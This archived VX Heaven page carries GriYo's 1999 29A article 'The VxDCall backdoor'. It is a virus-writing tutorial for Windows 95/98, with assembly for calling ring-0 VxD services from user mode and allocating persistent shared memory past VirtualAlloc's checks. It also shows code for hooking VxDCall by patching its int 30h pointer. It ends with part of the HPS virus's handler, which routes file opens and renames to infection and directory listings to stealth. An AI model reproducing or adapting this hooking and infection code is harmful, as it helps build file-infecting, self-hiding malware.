@@ -1,0 +1,571 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> GriYo 'The VxDCall backdoor' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="GriYo"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, GriYo,VxDCall backdoor, file, vwin, user, push, memory, allocated, shared, calls, semaphore, instruction, virus, vxdcall, control, ring, interrupt"/>
+<meta name="Description" content="After I read this fragment in  Matt Pietrek's  book 'Windows95 System Programming Secrets'  I thought that VxD's might contain exported services, as DLL's do. I knew that VxD's exported services to other VxD's but did they export services to Win32?. If that was the case these services could be very useful for virus programming, because they are similar to API's but is running at ring-0."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"047a8b78022960fa940758c1f6e6f4fe6bfff09e-1498757551-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vgy06.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>The VxDCall backdoor</h1><p><a href="/lib/?lang=en&amp;author=GriYo"> GriYo</a><br/> <em><a href="/vx.php?fid=7#f7">29a [3]</a></em><br/> <em>January 1999</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vgy06.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=WI#vgy06">Back to index</a>] [<a href="/lib/vgy06.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#p1">"USER MODE" and "SUPERVISOR MODE"</a></li>
+<li><a href="#p2">"SUPERVISOR MODE" hacking</a></li>
+<li><a href="#p3">The API VxDCall</a></li>
+<li><a href="#p4">Win32 services exported by system VxD's</a></li>
+<li><a href="#p5">KERNEL32.DLL and the interrupt 21h</a></li>
+<li><a href="#p6">Interrupt 21h functions</a></li>
+<li><a href="#p7">Allocating shared memory</a></li>
+<li><a href="#p8">VxDCall hooking</a></li>
+<li><a href="#p9">Last words</a></li>
+</ul>
+<h2><a name="p1">"USER MODE" and "SUPERVISOR MODE"</a></h2>
+<p>Windows95/98 uses two of the four protection levels supported by the i386 proccessor and its succesors:</p>
+<ul>
+<li>The ring-3 level, also called 'user mode', dedicated to user applications. Only API services can be accessed trough this privilege level.</li>
+<li>The ring-0 level is exclusively for the the kernel and is also known as 'supervisor mode'. There are no restrictions at the resources or services accessible trough this privilege level.</li>
+</ul>
+<p>We all know that user applications are potential targets for viruses. If you are going to write a PE file infector your code will be executed at 'user mode', under the strict control of the operating system. Can the execution escape from this privilege level?</p>
+<h2><a name="p2">"SUPERVISOR MODE" hacking</a></h2>
+<p>When an infected program is executed the virus code receives control for the very first time. At this point we know that the virus is working under 'user mode', far away from the 'supervisor mode'. To reach ring-0 we have to use one of the below described methods:</p>
+<ul>
+<li>Try to exploit a vulnerability that can get us to ring-0 in a illegal way. To learn more about this method I suggest you have a look at viruses like Sexy, CIH or Padania. You can read more about this specific technique in other articles in this issue of 29A.</li>
+<li>The virus can drop a VxD file that can either be dynamically loaded or loaded the next time the computer reboots. This technique has been exploited by alot of authors. To find information on how to write viral VxD's you can read my article "Virus oriented VxD writting tutorial", published in 29A issue 2.</li>
+<li>If you dont want to use your own VxD, you can use another VxD which already is loaded. This is possible due to a API called VxDCall. This API let us use a lot of services exported by system VxD's to Win32. This article shows how to exploit this technique for virus programming.</li>
+</ul>
+<h2><a name="p3">The API VxDCall</a></h2>
+<p><q>... A VxD is really nothing more than a DLL that runs at the highest privilege level of the processor (ring 0). Since VxD's runs at ring 0, there's essentially nothing they can't do</q>.</p>
+<p>After I read this fragment in Matt Pietrek's book 'Windows95 System Programming Secrets' I thought that VxD's might contain exported services, as DLL's do. I knew that VxD's exported services to other VxD's but did they export services to Win32?. If that was the case these services could be very useful for virus programming, because they are similar to API's but is running at ring-0.</p>
+<p>After reading more at this subject I learned the answer to the above question. Yes VxD's contains all kind of services that are exported to other VxD's and Win32. The problem was now how to communicate with the VxD's at ring-0 from ring-3, which the virus is at.</p>
+<p>After a little more research, I found a API called DeviceIoControl. This API allows a application to send/receive information to/from a VxD file. I then did some testing and learned this wasn't the API I was looking for, as DeviceIoControl doesn't allow the application to use services exported by VxD's.</p>
+<p>When I tried to find some information about how to call Win32 services inside VxD's, all I could find was a reference. It seems to me like some poor attempt to hide important information about the internals of the operating system.</p>
+<p>The key to it all is a undocumented API, which lets us use a powerful interface between ring-3 and ring-0. This API is called VxDCall and is exported by KERNEL32.DLL, but wait! Dont browse KERNEL32 exported API names because its not there. In order to drop more shadows on this Microsoft coders decided to hide this API, exporting it only as ordinal, not as name.</p>
+<p>If we look at KERNEL32.DLL, we'll find tons of calls to this API. In some cases KERNEL32 code is just a wrapper between applications and VxD services.</p>
+<p>The following piece of code shows how to call the service _PageFree, exported by VMM.VXD to Win32:</p>
+<pre class="source">
+		push 00000000h
+		push dword ptr [allocated_addr]
+		push 0001000Ah
+		call dword ptr [a_VxDCall]
+		jmp init_error
+</pre>
+<p>The first two instruction push the parameters needed by _PageFree into the stack. The 3rd instruction is part of the protocol used to call VxDCall. The low-word is an index that indentifies the service we want to call. The high-word indentifies the VxD containing that service. In this example the codification is:</p>
+<pre class="source">
+		0001h = VMM.VXD
+		000Ah = _PageFree
+</pre>
+<p>If we debug a call to KERNEL32 VirtualFree API we will find that the code just checks input parameters. Some lines ahead is a call to VMM _PageFree service, wich do the dirty work.</p>
+<p>Now lets see some of the services exported to Win32 by system VxD's. Just by reading the name of the service you can imagine lots of ideas on how to use them in virus writing.</p>
+<h2><a name="p4">Win32 services exported by system VxD's</a></h2>
+<p>Services exported by VMM.VXD:</p>
+<pre class="source">
+00010000h	PageReserve
+00010001h	PageCommit
+00010002h	PageDecommit
+00010003h	PagerRegister
+00010004h	PagerQuery
+00010005h	HeapAllocate
+00010006h	ContextCreate
+00010007h	ContextDestroy
+00010008h	PageAttach
+00010009h	PageFlush
+0001000Ah	PageFree
+0001000Bh	ContextSwitch
+0001000Ch	HeapReAllocate
+0001000Dh	PageModifyPermissions
+0001000Eh	PageQuery
+0001000Fh	GetCurrentContext
+00010010h	HeapFree
+00010011h	RegOpenKey
+00010012h	RegCreateKey
+00010013h	RegCloseKey
+00010014h	RegDeleteKey
+00010015h	RegSetValue
+00010016h	RegDeleteValue
+00010017h	RegQueryValue
+00010018h	RegEnumKey
+00010019h	RegEnumValue
+0001001Ah	RegQueryValueEx
+0001001Bh	RegSetValueEx
+0001001Ch	RegFlushKey
+0001001Dh       ???
+0001001Eh	GetDemandPageInfo
+0001001Fh	BlockOnID
+00010020h	SignalID
+00010021h	RegLoadKey
+00010022h	RegUnloadKey
+00010023h	RegSaveKey
+00010024h	RegRemapPreDefKey
+00010025h	PageChangePager
+00010026h	RegQueryMultipleValues
+00010027h	RegReplaceKey
+</pre>
+<p>Another VxD exporting services to Win32 is VWIN32.VXD. Some of this services are:</p>
+<pre class="source">
+002A0000	GetVersion
+002A0001	Stuff VWIN32 code pointers into caller-supplied buffer
+002A0002	Get system time
+002A0003	Stuff code pointers from KERNEL32 into VWIN32's data area
+002A0004	Block on some semaphore
+002A0005	Calls Signal_Semaphore_No_Switch on some semaphore
+002A0006	Calls VMM Create_Semaphore, and stuff into global var
+002A0007	Calls VMM Destroy_Semaphore on semaphore created by 002A0006
+002A0008	VWIN32_CreateThread (including allocating TDBX)
+002A0009	VWIN32_Sleep
+002A000A	WakeThread
+002A000B	TerminateThread
+002A000C	Some sort of initialization function
+002A000D	_VWIN32_QueueUserApc
+002A000E	VWIN32_Initialize
+002A000F	_VWIN32_QueueKernelApc
+002A0010	VWIN32_Int21Dispatch
+002A0011	Calls IFSMgr_Win32DupHandle
+002A0012	VWIN32_BlockThreadSetBit
+002A0013	Adjust_Thread_Exec_Priority
+002A0014	_VWIN32_Get_Thread_Context
+002A0015	_VWIN32_Set_Thread_Context
+002A0016	Read process memory
+002A0017	Write process memory
+002A0018	Calls VMCPD_Get_CR0_State
+002A0019	Calls VMCPD_Set_CR0_State
+002A001A	SuspendThread
+002A001B	ResumeThread
+002A001C	???
+002A001D	WaitCrst
+002A001E	WakeCrst
+002A001F	Something to do with loading/unloading VxD's
+002A0020	WMCPD_Get_Version
+002A0021	Set_Thread_Win32_Pri
+002A0022	Calls Boost_With_Decay
+002A0023	Calls Set_Inversion_Pri
+002A0024	Calls Release_Inversion_Pri_ID
+002A0025	Calls Release_Inversion_Pri
+002A0026	Calls Attach_Thread_To_Group
+002A0027	Calls Set_Thread_Static_Boost
+002A0028	Calls Set_Group_Static_Boost
+002A0029	VWIN32_Int31Dispatch
+002A002A	VWIN32_Int41Dispatch
+002A002B	VWIN32_BlockForTermination
+002A002C	TerminationHandler2
+002A002D	???
+002A002E	dwBlockSingleWnod (WaitForSingleObject)
+002A002F	dwBlockMultipleWnod (WaitForMultipleObjects)
+002A0030	VWIN32_SetEvent
+002A0031	Something to do with delivering APC's
+002A0032	???
+002A0033	InitUserAPCList
+002A0034	???
+002A0035	Calls VMM Signal_Semaphore_No_Switch
+002A0036	Calls System_Control (KERNEL32_INITIALIZED)
+002A0037	VWIN32_CommonFaultPopup
+002A0038	VWIN32_ForceCrsts
+002A0039	???
+002A003A	VWIN32_FreezeAllThreads
+002A003B	VWIN32_UnFreezeAllThreads
+002A003C	Calls IFS_Mgr_Ring0_FileIO
+002A003D	Calls Get_Initial_Thread_Handle, Attach_Thread_To_Group and
+                Boost_Thread_With_VM
+002A003E	VWIN32_ActivateTimeBiasSet
+002A003F	ModifyPagePermission (used by VirtualQueryEx)
+002A0040	Used by VirtualQueryEx
+002A0041	ForceLeaveCrst
+002A0042	ForceEnterCrst
+002A0043	Calls VMCPD_Set_Thread_Excpt_Type
+002A0044	VTD_Get_Real_Time
+002A0045	Calls System_Control (SET_DEVICE_FOCUS)
+002A0046	Calls VWIN32_UnFreezeThread
+002A0047	Calls VMM_Replace_Global_Environment
+002A0048	Calls System_Control (KERNEL32_SHUTDOWN)
+002A0049	???
+002A004A	VW32_AddSysCrst
+002A004B	VW32_SetTimeOut
+002A004C	VW32_Cancel_Time_Out
+002A004D	???
+002A004E	Something to do with setting and reflecting hotkeys
+
+		Notes:
+
+		Crst means Critical Section
+
+                APC means Asynchronous Procedure Call
+
+                VMCPD is the Virtual Math Coprocessor Device
+
+                IFSMgr is the Installable File System Manager
+
+                System_Control is the VMM.VXD ring 0 service that broadcasts
+                system control messages to VxD's.
+</pre>
+<h2><a name="p5">KERNEL32.DLL and the interrupt 21h</a></h2>
+<p>Look close at VWIN32 exported services. There is one called VWIN32_Int21Dispatch. Its is a backdoor that allows Win32 to call the well known interrupt 21h. Now search the KERNEL32 code and look for calls to this service. Oh! There are hundreds! I though Microsoft said that Windows95 doesnt deppend on MsDos. Below is a example of how to call interrupt 21h using that service:</p>
+<pre class="source">
+my_int21h:	push ecx
+		push eax
+		push 002A0010h
+		call dword ptr [ebp+a_VxDCall]
+		ret
+</pre>
+<p>I found the right way to call VWIN32_Int21hDispatch by looking at how KERNEL32 calls it. I learned that Windows uses interrupt 21h to perform tasks such as: find, open, read, write, close, delete or rename files. By hooking all these functions with VxDCall, we can effectively monitor file access.</p>
+<h2><a name="p6">Interrupt 21h functions</a></h2>
+<p>This is a list of interrupt 21h functions for MS-DOS LFN (long file name) extension. KERNEL32 uses these functions continiuosly.</p>
+<pre class="source">
+0E00		Set default drive
+1900		Get current drive
+2A00		Get system date
+2B00		Set system date
+2C00		Get system time
+2D00		Set system time
+3600		Get disk free space
+3D00		Open existing file for read only
+3D02		Open existing file for read/write
+3E00		Close file
+3F00		Read file
+4000		Write file
+4200		Set current file position relative to start of file
+4201		Set current file position relative to current position
+4202		Set current file position relative to end of file
+4400		IOCTL get device information
+4401		IOCTL set device information
+4408		IOCTL check if block device is removable
+4409		IOCTL check if block device remote
+440D		IOCTL generic block device request
+4B00		Exec program
+4D00		Get return code
+5000		Set current PSP
+5700		Get file date/time
+5701		Set file date/time
+5704		Set extended file attributes
+5900		Get extended error info
+5C00		Lock file region
+5C01		Unlock file region
+5E00		Network functions
+6800		Commit file
+7139		LFN create directory
+713A		LFN remove directory
+713B		LFN change directory
+7141		LFN delete file
+7143		LFN get/set file attributes
+7147		LFN get current directory
+714E		LFN find first file
+714F		LFN find next file
+7156		LFN rename file
+7160		LFN get canonical filename
+716C		LFN extended open/create
+71A0		LFN get volume information
+71A1		LFN find close
+71A6		LFN get file info by handle
+71A7		LFN file time to DOS time
+</pre>
+<p>The following example shows how to use these functions. This code will be useful later in our virus.</p>
+<pre class="source">
+;Move file pointer
+;
+;Entry:		ebx = File handle
+
+seek_here:	;Move pointer to position specified in edx
+		mov eax,edx
+           	and eax,0FFFF0000h
+		shr eax,10h
+		mov ecx,eax
+		mov eax,00004200h                
+		jmp short seek_now
+
+seek_bof:	;Move pointer to beginning of file
+		mov eax,00004200h                       
+		jmp short do_seek
+
+seek_eof:	;Move pointer to end of file
+		mov eax,00004202h
+do_seek: 	xor edx,edx
+		xor ecx,ecx
+seek_now:	call my_int21h
+		jc exit_seek
+		and eax,0000FFFFh
+		shl edx,10h
+		or eax,edx
+		xor edx,edx
+		clc
+exit_seek:	ret
+</pre>
+<h2><a name="p7">Allocating shared memory</a></h2>
+<p>We can use the functions exported by VMM.VXD in the same way we used with VWIN32.VXD. Lets have a look at the services used by VMM.VXD to handle 'page-based' memory in Windows95.</p>
+<ul>
+<li>_GetDemandPageInfo</li>
+<li>_PageAttach</li>
+<li>_PageCommit</li>
+<li>_PageDecommit</li>
+<li>_PageDecommit</li>
+<li>_PageFlush</li>
+<li>_PageFlush</li>
+<li>_PageFree</li>
+<li>_PageModifyPermisions</li>
+<li>_PageQuery</li>
+<li>_PageReserve</li>
+</ul>
+<p>This services correspond with the ones in KERNEL32 APIs used for handling 'virtual memory'. In some cases that code at KERNEL32 just checks the entry parameters and call the corresponding service in VMM.VXD.</p>
+<p>We now how to allocate 'virtual memory' in Win32:</p>
+<pre class="source">
+VirtualAlloc ( 	LPVOID lpAddress,
+		DWORD dwSize,
+		DWORD flAllocationType,
+		DWORD flProtect );
+</pre>
+<p>The VirtualAlloc function reserves or commits a region of pages in the virtual address space of the calling process. The entry parameters are:</p>
+<dl>
+<dt>lpAddress</dt>
+<dd>Specifies the desired starting address of the region to allocate. If this parameter is NULL, the system determines where to allocate the region.</dd>
+<dt>dwSize</dt>
+<dd>Specifies the size, in bytes, of the region. If the lpAddress parameter is NULL, this value is rounded up to the next page boundary.</dd>
+<dt>flAllocationType</dt>
+<dd>Specifies the type of allocation. You can specify any combination of the following flags:
+<dl>
+<dt>MEM_COMMIT</dt>
+<dd>Allocates physical storage in memory or in the paging file on disk for the specified region of pages. An attempt to commit an already committed page will not cause the function to fail. This means that a range of committed or decommitted pages can be committed without having to worry about a failure.</dd>
+<dt>MEM_RESERVE</dt>
+<dd>Reserves a range of the process's virtual address space without allocating any physical storage. The reserved range cannot be used by any other allocation operations (the malloc function, the LocalAlloc function, and so on) until it is released. Reserved pages can be committed in subsequent calls to the VirtualAlloc function.</dd>
+</dl></dd>
+<dt>flProtect</dt>
+<dd>Specifies the type of access protection. If the pages are being committed, any one of the following flags can be specified, along with the PAGE_GUARD and PAGE_NOCACHE protection modifier flags, as desired:
+<ul>
+<li>PAGE_READONLY</li>
+<li>PAGE_READWRITE</li>
+<li>PAGE_EXECUTE</li>
+<li>PAGE_EXECUTE_READ</li>
+<li>PAGE_EXECUTE_READWRITE</li>
+<li>PAGE_GUARD</li>
+<li>PAGE_NOACCESS</li>
+<li>PAGE_NOCACHE</li>
+</ul></dd>
+</dl>
+<p>Lets trace a call to VirtualAlloc with the debugger. We will see how this API checks the entry parameters and then calls to the service _PageReserve in VMM.VXD, using VxDCall. During the execution of VirtualAlloc API the call will return with error in the folling cases:</p>
+<ul>
+<li>If dwSize specifies too much space.</li>
+<li>If lpAddress is an invalid address.</li>
+<li>If the undocumented flag MEM_SHARED was included.</li>
+<li>If the call to _PageReserve fails.</li>
+</ul>
+<p>Although we know the existence of the flag MEM_SHARED, we cant use it due to the checks performed by VirtualAlloc. In order to allocate a region of pages into system shared memory we are going to bypass the calling protocol and go straigh to _PageReserve. Here is an example:</p>
+<pre class="source">
+                push PC_WRITEABLE or PC_USER
+                push page_mem_size                      ;Size
+                push PR_SHARED
+                push 00010000h                          ;Call to _PageReserve
+                call dword ptr [ebp+a_VxDCall]          ;...using VxDCall
+                cmp eax,0FFFFFFFFh                      ;Error?
+                je init_error
+                cmp eax,80000000h                       ;Into shared memory?
+                jb free_pages
+                mov dword ptr [ebp+mem_address],eax     ;Save region address
+                push PC_WRITEABLE or PC_USER or PC_PRESENT or PC_FIXED
+                push 00000000h
+                push PD_ZEROINIT
+                push page_mem_size                      ;Size
+                shr eax,0Ch                             ;Page number
+                push eax                                
+                push 00010001h                          ;Call to _PageCommit
+                call dword ptr [ebp+a_VxDCall]          ;...using VxDCall
+                or eax,eax
+                je free_pages
+</pre>
+<p>In the first call to VxDCall i used the service _PageReserve from VMM.VXD (0001h = VMM.VXD and 0000h = _PageReserve). As first entry parameter we specify the type of memory to allocate, using the following flags:</p>
+<dl>
+<dt>PC_FIXED</dt>
+<dd>Commit a region of locked memory. This pages will stay locked along all the session.</dd>
+<dt>PC_LOCKED</dt>
+<dd>Commit a regin of locked memory that can be unlocked later.</dd>
+<dt>PC_WRITEABLE</dt>
+<dd>Write access to the commited pages.</dd>
+<dt>PC_USER</dt>
+<dd>This is a must if you want to access the allocated pages from ring-3.</dd>
+</dl>
+<p>After this the routines pushes into stack the number of bytes to allocate. The last parameter is the starting page for the allocated region, but you can also specify one of the following flags:</p>
+<dl>
+<dt>PR_PRIVATE</dt>
+<dd>Reserve memory in the ring-3 privated area for each application,</dd>
+<dt>PR_SHARED</dt>
+<dd>Reserve memory in the ring-3 shared area.</dd>
+<dt>PR_SYSTEM</dt>
+<dd>Reserve ring-0 memory.</dd>
+</dl>
+<p>By means of PR_SHARED flag our memory region will be allocated into shared memory, and this area will be visible for all applications. This is important if we plan to monitor all the calls suited by any application.</p>
+<p>In case of error Page_Reserve will return 0FFFFFFFFh in eax register. If the memory was allocated without problems eax is a pointer to it. Then we can check if the pages was allocated at shared memory area, this is, above 80000000h.</p>
+<p>Once the memory is allocated it's time to tell the operating system to map that memory into physical memory. For this purpose is _PageCommit, exported by VMM.</p>
+<p>The first parameter are some flags similar to the ones used in the call to _PageReserve. This time we specify PC_PRESENT to keep the memory once the owner program terminates.</p>
+<p>I use 0 as next parameter, i dont want to mess with 'PAGERS' and other details of the memory managment, this is out of the purpose of this article.</p>
+<p>Then we use PD_ZEROINIT to initialize allocated memory with zero's. The last parameter specifies the number of pages to commit. In case of error the call will return 0, and the virus have to free previously allocated pages:</p>
+<pre class="source">
+free_pages:	xor eax,eax
+                push eax
+                push dword ptr [ebp+mem_address]
+                push 0001000Ah
+                call dword ptr [ebp+a_VxDCall]
+</pre>
+<p>The work is done, now our virus can allocate a block of memory that will stay there after the application terminates. The virus can copy its body to this area and redirect some kernel functions to pass through our code before or after being executed.</p>
+<h2><a name="p8">VxDCall hooking</a></h2>
+<p>Take the debugger and have a look at how the VxDCall function comunicates with VxD's. You will find something like this:</p>
+<pre class="source">
+		mov eax,dword ptr [esp+00000004h]
+		pop dword ptr [esp]
+		call fword ptr cs:[BFFC9004]
+</pre>
+<p>This code loads eax with the identifier of the VxD containing the desired service. After a stack fix everything is ready for jumping to the service code. The call instruction will translate us to:</p>
+<pre class="source">
+		int 30h
+</pre>
+<p>Nice... Seems like the system is using interrupt 30h to jump into ring-0. If you trace into the interrupt call you will fall somewhere inside VMM.VXD.</p>
+<p>Now lets have a closer look at VxDCall code, soecially to the followin instruction:</p>
+<pre class="source">
+		call fword ptr cs:[BFFC9004]
+</pre>
+<p>This instruction will translate the execution to the address stored into cs:[BFFC9004]. This address points to the interrupt call. If we overwrite this value with a pointer to our own handler we succesfully hooked VxDCall.</p>
+<pre class="source">
+		mov esi,dword ptr [ebp+a_VxDCall]       ;VxDCall address
+		mov ecx,00000100h                       ;Explore 0100h bytes
+trace_VxDCall:  lodsb
+		cmp al,2Eh
+		jne trace_next
+		cmp word ptr [esi],1DFFh
+		je get_int30h
+trace_next:	loop trace_VxDCall                      
+</pre>
+<p>The code above follows the VxDCall API code looking for the following sequence of byte:</p>
+<pre class="source">
+		2E FF 1D xx xx xx xx  CALL FWORD PTR CS:[xxxxxxxx]
+</pre>
+<p>When the virus finds the call instruction it can extract the value there, save it inside virus code and patch it to point to the viral handler.</p>
+<pre class="source">
+		cli
+		lodsw                                   ;Skip FF 1D opcodes
+		lodsd                                   ;Get ptr to INT 30h
+		push eax
+		mov esi,eax
+		mov edi,dword ptr [ebp+mem_address]
+		add edi,VxDCall_code-mem_base
+		mov ecx,00000006h
+		rep movsb
+		pop edi                                 
+		mov eax,dword ptr [ebp+mem_address]
+		add eax,VxDCall_hook-mem_base
+		stosd
+		mov ax,cs                               ;Overwrite far ptr
+		stosw
+		sti
+</pre>
+<p>We stop interrupts before proceeding. Then take the address of xxxxxxxx and we find a 'FWORD' that point to the int 30h instruction. 'FWORD' are six bytes, the virus have to copy this bytes into a save buffer inside its body.</p>
+<p>Finally we write the address of our handler, first the 32bits offset and the segment next (remember that 'FWORD' is a 16:32 value). Turn on interrupts, now the hook is active.</p>
+<p>Below is a portion of the HPS virus, the interrupt handler:</p>
+<pre class="source">
+VxDCall_hook:   pushad
+
+                call mem_delta                          ;Get "in-memory"
+mem_delta:      pop ebp                                 ;delta offset
+                sub ebp,offset mem_delta
+
+                cmp dword ptr [ebp+hook_status],"BUSY"  ;Dont process our
+                je exit_hook                            ;own calls
+
+                cmp eax,002A0010h                       ;VWIN32 VxD int 21h?
+                jne exit_hook
+
+                mov eax,dword ptr [esp+0000002Ch]
+                
+                cmp ax,2A00h                            ;Get system time?
+                je tsr_check
+
+                cmp ax,3D00h                            ;Open file read?
+                je infection_edx
+
+                cmp ax,3D01h                            ;Open file
+                je infection_edx                        ;read/write?
+                
+                cmp ax,7143h                            ;X-Get/set attrib?
+                je infection_edx
+
+                cmp ax,714Eh                            ;LFN find first file
+                je stealth
+
+                cmp ax,714Fh                            ;LFN find next file
+                je stealth
+
+                cmp ax,7156h                            ;LFN rename file?
+                je infection_edx
+
+                cmp ax,716Ch                            ;LFN extended open?
+                je infection_esi
+
+                cmp ax,71A8h                            ;Generate short name?
+                je infection_esi
+
+exit_hook:      popad
+
+do_far_jmp:     ;Do a jmp fword ptr cs:[xxxxxxxx] into original code
+
+                db 2Eh,0FFh,2Dh
+ptr_location    dd 00000000h
+</pre>
+<p>Some readers will notice that the virus sets a global variable at the beginning of the handler code. This variable works as semaphore and it's purpose is to avoid the virus from proccesing its own calls to VxDCall.</p>
+<p>Next, the virus checks if the requested service is VWIN32_Int21Dispatch. If so the function number specified by the caller is read from the stack. The virus looks for interesting functions and perform the corresponding tasks.</p>
+<p>Finally the execution is passed to the original VxDCall function, which address we saved before.</p>
+<h2><a name="p9">Last words</a></h2>
+<p>This is just another backdoor in Windows95 security, that is also present under Windows98. I wrote the HPS virus to show how to exploit this.</p>
+<p>HPS shows how to trick VxDCall to infect files and perform its stealth routine. The virus also uses VxDCall to 'bypass' KERNEL32 memory managment, fooling all checks.</p>
+<pre>
+				GriYo/29A
+				I'm not in the business... I am the business
+</pre>
+[<a style="" href="/lib/?lang=EN&amp;index=WI#vgy06">Back to index</a>] [<a href="/lib/vgy06.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vgy06">de</a><a href="/lib/index.php?lang=en&amp;id=vgy06">en</a><a href="/lib/index.php?lang=es&amp;id=vgy06">es</a><a href="/lib/index.php?lang=it&amp;id=vgy06">it</a><a href="/lib/index.php?lang=fr&amp;id=vgy06">fr</a><a href="/lib/index.php?lang=pl&amp;id=vgy06">pl</a><a href="/lib/index.php?lang=ru&amp;id=vgy06">ru</a><a href="/lib/index.php?lang=ua&amp;id=vgy06">ua</a></div>
+</body>
+</html>
